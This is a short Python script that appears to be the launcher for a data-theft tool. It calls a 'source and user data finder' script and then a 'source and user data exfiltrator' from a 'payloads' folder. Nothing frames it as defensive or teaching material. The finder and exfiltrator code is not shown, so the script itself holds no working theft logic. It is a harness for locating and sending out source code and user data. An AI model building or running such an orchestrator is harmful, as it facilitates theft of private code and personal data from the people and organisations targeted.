import subprocess
import os

def main():
    # Run the source and user data finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "source_user_data_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the source and user data exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "source_user_data_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
